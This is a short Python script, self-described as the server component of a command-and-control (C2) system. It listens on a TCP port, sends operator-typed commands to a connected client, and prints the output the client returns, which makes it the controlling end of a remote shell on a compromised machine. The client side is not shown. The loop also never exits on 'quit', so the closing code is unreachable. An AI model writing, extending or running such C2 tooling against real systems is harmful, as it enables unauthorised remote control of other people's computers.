"""
Server component of C2
"""
import socket
import threading 

# Port to listen for connections on 
port = 12102
 
def main():    
    # Creating server socket 
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.bind(('', port))
    server_sock.listen(10)
    print("Waiting for incoming connection...")

    # Getting connection 
    (client_sock, client_addr) = server_sock.accept()
    print("Connected from: ", client_addr)

    # Sending string to the client
    while True:
        command = input("> ")
        padCommand = (command.ljust(1024, "\0")).encode("utf-8")
        client_sock.send(padCommand)

        # Receiving output from the client
        if(command != "quit"):
            # Recieve one byte at a time, end character is 0xFF
            output = bytes.decode(client_sock.recv(1))
            while True: 
                data = client_sock.recv(1)
                if(data == b"\xff"):
                    break
                output += bytes.decode(data)
            
            print(output)
        
    # Close client socket connection when done
    client_sock.close()
    server_sock.close()

if __name__ == '__main__':
    main()